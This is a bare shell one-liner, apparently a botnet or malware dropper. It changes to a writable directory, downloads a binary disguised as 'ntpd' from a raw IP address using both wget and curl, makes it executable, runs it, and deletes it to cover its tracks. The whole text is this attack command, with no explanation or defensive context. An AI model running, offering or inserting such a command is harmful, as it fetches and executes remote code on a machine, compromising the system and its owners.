cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.62/ntpd; curl -O http://208.67.1.62/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
